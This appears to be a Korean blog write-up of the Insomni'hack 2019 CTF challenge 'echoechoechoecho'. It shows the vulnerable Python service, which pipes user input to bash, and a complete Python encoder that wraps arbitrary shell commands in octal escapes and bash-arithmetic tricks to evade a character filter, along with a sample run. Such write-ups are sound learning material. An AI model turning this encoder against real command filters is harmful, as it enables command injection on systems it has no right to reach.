---
layout: post
title: ! "[Insomni'hack 2019] echoechoechoecho Write-up"
excerpt_separator: <!--more-->
comments : true
tags:
  - insomnihack2019
  - Write-up
  - CTF
---

### Description

> Echo echo echo echo, good luck
>
> nc 35.246.181.187 1337


<!--more-->

### 문제

문제에 접속해보면 echo라는 대문짝만한 ASCII-ART 글자와 `Hi, what would you like to echo today? (make sure to try 'thisfile')`라는 글자를 볼 수 있다. thisfile을 입력하면 소스코드를 보여준다. 문제를 다시 풀 때에는 서버가 닫혀있어서 `Docker`를 이용해서 임의의 가상환경을 구성하였으며, [p4-team write-up](https://github.com/p4-team/ctf/blob/master/2019-01-19-insomnihack-quals/echoechoechoecho/README.md)을 참고하였다.

```python
#!/usr/bin/env python3

from os import close
from random import choice
import re
from signal import alarm
from subprocess import check_output
from termcolor import colored

alarm(10)

colors = ["red","blue","green","yellow","magenta","cyan","white"]
# thanks http://patorjk.com/software/taag/#p=display&h=0&f=Crazy&t=echo
banner = """
                            _..._                 .-'''-.
                         .-'_..._''.             '   _    \\
       __.....__       .' .'      '.\  .       /   /` '.   \\
   .-''         '.    / .'           .'|      .   |     \  '
  /     .-''"'-.  `. . '            <  |      |   '      |  '
 /     /________\   \| |             | |      \    \     / /
 |                  || |             | | .'''-.`.   ` ..' /
 \    .-------------'. '             | |/.'''. \  '-...-'`
  \    '-.____...---. \ '.          .|  /    | |
   `.             .'   '. `._____.-'/| |     | |
     `''-...... -'       `-.______ / | |     | |
                                  `  | '.    | '.
                                     '---'   '---'
"""

def bye(s=""):
    print(s)
    print("bye")
    exit()

def check_input(payload):
    if payload == 'thisfile':
        bye(open("/bin/shell").read())

    if not all(ord(c) < 128 for c in payload):
        bye("ERROR ascii only pls")

    if re.search(r'[^();+$\\= \']', payload.replace("echo", "")):
        bye("ERROR invalid characters")

    # real echolords probably wont need more special characters than this
    if payload.count("+") > 1 or \
            payload.count("'") > 1 or \
            payload.count(")") > 1 or \
            payload.count("(") > 1 or \
            payload.count("=") > 2 or \
            payload.count(";") > 3 or \
            payload.count(" ") > 30:
        bye("ERROR Too many special chars.")

    return payload


print(colored(banner, choice(colors)))
print("Hi, what would you like to echo today? (make sure to try 'thisfile')")
payload = check_input(input())


print("And how often would you like me to echo that?")
count = max(min(int(input()), 10), 0)

payload += "|bash"*count

close(0)
result = check_output(payload, shell=True, executable="/bin/bash")
bye(result.decode())
```

크게 중요한 부분은 `check_input` 부분과 `payload += "|bash"*count`이다. 먼저 문자열을 입력하면 `check_input`으로 필터링을 거친 뒤, 뒤이어 입력하는 `count` (0~10)만큼 `|bash`를 덧붙여주는 식이다. `check_input`부분을 분석 해 보면 사용 가능한 문자가 `^`, `(`, `)`, `;`, `+`, `$`, `\`, `=`, 공백, `'`의 특수문자 리스트와 `echo` 라는 문자열로 제한되어 있음을 볼 수 있다. 심지어 몇가지 특수문자의 경우에는 사용 횟수 제한도 있다. 이것들만 가지고 필터링을 우회하여 원하는 명령을 실행시켜야 한다.

### Stage 1 - 원하는 명령 실행하기

어떤 명령을 실행시키기 위해서, 우리가 사용할 수 있는 특수문자들을 조합 해 본다. 예를 들어 `ls` 명령어를 실행시킨다고 가정했을 때, 다음과 같이 입력할 수 있다.

`echo $'\154\163' |bash` 

위와같이 입력했을 때 `echo` 명령어에 의해서 `ls`가 출력되고, 이는 파이프 라인을 통해서 `bash` 명령어의 입력으로 들어가 `ls`명령어를 실행시킨다. 그럼 이제 우리는 **1) 임의의 숫자를 구하기**, **2) 특수문자 사용 횟수 제한 우회하기**의 두가지 문제를 해결해야 한다.

### Stage 2 - 임의의 숫자 구하기

임의의 숫자를 구하는 것은 단순하다. `$$`는 현재 실행되고 있는 프로세스의 `pid`를 뜻한다. 중요한건 그게 아니라, shell 에서의 산술 연산을 통해서 우리가 원하는 임의의 숫자를 구할 수 있다는 것이다. 먼저 `1`을 표현하기 위해서는 다음과 같이 하면 된다.

`$(($$==$$))`

그럼 이제 이 결과를 임의의 변수에 넣어본다. 사실 사용할 수 있는 변수명이 `echo`뿐이다..

`echo=$(($$==$$))`

이제 `$echo`의 값은 1이다. 그럼 이걸 토대로 `2`를 표현 해 보자.

`echoecho=$(($echo+$echo))`

더 간단해졌다. `$echoecho`의 값이 2가 된다. 이를 토대로 모든 숫자를 연산할 수 있게 된다.

### Stage 3 ~ 8 - 특수문자 사용 횟수 제한 우회하기

마지막 남은 단계다. `Stage 1`, `Stage 2`에서 나온 방법대로만 하면 인코딩하는게 어렵지 않은데, 하필이면 특수문자 사용 횟수가 제한되어 있어서 문제를 까다롭게 만든다. 하지만 `Write-up`을 확인해보니 크게 어렵지 않았다는 것을 알 수 있었다. 예를 들어 `(`의 사용 횟수는 1회로 제한되어 있는데, 이를 우회하기 위해서는 다음과 같이 할 수 있다.

`echo=\(; echo $echo$echo` (count:0)

해당 출력으로는 `((`가 되시겠다. 대충 감이 오는가? 다행스럽게도 `escape character` 역할을 하고 있는 백슬래쉬(`\`)가 횟수 제한이 없어서 수월하게 진행할 수 있다. 횟수 필터링에 공백은 딱히 우회하지 않아도 된다. 그리고 `=`랑 `;`는 모든 우회 단계에서 공통적으로 사용하므로 마지막에 인코딩해야 하고, 특히 `=`는 맨 마지막에 해야 좀 빡빡한 횟수제한에 안걸리는거 주의해야 한다. 그 외에는 어떤순서로 인코딩해도 상관이 없다. 이에 따른 최종 페이로드는 아래와 같다.

```python
import string
import re
import sys

cmd = sys.argv[1]

# Encode using $'\123\234'
def stage1(cmd):
    return "echo $'" + "".join("\\%o" % ord(d) for d in cmd) + "'"

def escape(cmd):
    def enc(c):
        if c in "\\$()';":
            return "\\" + c
        return c

    return "".join(enc(c) for c in cmd)

# Encode digits using bash arithmetics.
def stage2(cmd):
    cmd = escape(cmd)
    def enc(c):
        if c not in string.digits:
            return c

        if c == "0":
            return "$(($$==$echo))"
        else:
            return "$((" + "+".join("$echo" for _ in range(int(c))) + "))"

    cmd = "".join(enc(c) for c in cmd)
    return "echo=$(($$==$$)); echo " + cmd


# Encode '
def stage3(cmd):
    cmd = escape(cmd)
    return "echo=\\'; echo " + cmd.replace("\\'", "$echo")

# Encode (
def stage4(cmd):
    cmd = escape(cmd)
    return "echo=\\(; echo " + cmd.replace("\\(", "$echo")

# Encode )
def stage5(cmd):
    cmd = escape(cmd)
    return "echo=\\); echo " + cmd.replace("\\)", "$echo")

# Encode +
def stage6(cmd):
    cmd = escape(cmd)
    return "echo=\\+; echo " + cmd.replace("+", "$echo")

# Encode ;
def stage7(cmd):
    cmd = escape(cmd)
    return "echo=\\;; echo " + cmd.replace("\\;", "$echo")

# Encode =
def stage8(cmd):
    cmd = escape(cmd)
    return "echo=\\=; echo " + cmd.replace("=", "$echo")



p = cmd
p = stage1(p)
p = stage2(p)
p = stage3(p)
p = stage4(p)
p = stage5(p)
p = stage6(p)
p = stage7(p)
p = stage8(p)

for c in set(p):
    print >>sys.stderr, c, p.count(c)
print p
```

사실 직접 짜보려고 했는데 `CTFTime`에서 5.0 받은 롸업이 너무 코드를 잘짰다… 더이상 손볼구석이 없다. 이 코드를 보면서 나도 연습을 좀 해보려고 한다.

아무튼 해당 코드를 적절히 돌려서 나온 결과물을 투척하고 `count`를 8로 주면 문제가 해결된다.

```bash
[+] Starting local process './serve.sh': pid 23257
[*] Switching to interactive mode

And how often would you like me to echo that?
$ 8
Dockerfile
requirements.txt
service.py

bye
[*] Got EOF while reading in interactive
```

사실 본 문제에서는 다른 명령어도 써야 하는데, 이미 인코더를 만들었으므로 다른 명령어도 인코딩하는게 어렵지 않다. 다음엔 직접 코드 짜는 연습도 해봐야겠다.
